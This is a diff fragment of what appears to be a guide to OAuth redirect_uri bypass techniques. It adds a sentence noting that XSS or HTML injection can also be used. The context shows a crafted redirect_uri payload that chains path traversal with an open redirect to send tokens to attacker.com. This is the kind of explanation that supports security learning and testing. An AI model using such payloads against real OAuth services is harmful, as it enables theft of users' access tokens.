@@ -50,6 +50,10 @@ When OAuth server is checking for the presence of complete correct ```redirect_u
 For an example, let's say the attacker has found an Open Redirection vulnerability in ```https://client-app.com/pages?path=``` and the OAuth server checks for the presence of whitelisted URI string ```https://client-app.com/oauth-callback```, then attacker can try passing this in the ```redirect uri``` :  
 ```redirect_uri=https://client-app.com/oauth-callback/../pages?path=http://attacker.com```   
 With this, the attacker can use the whitelisted domain vulnerability as a "proxy" to export the leaked tokens outside.  
+Similarly, other vulnerabilties like XSS, HTML Injection can be used for the same purpose.   
+
+
+
 
 
 
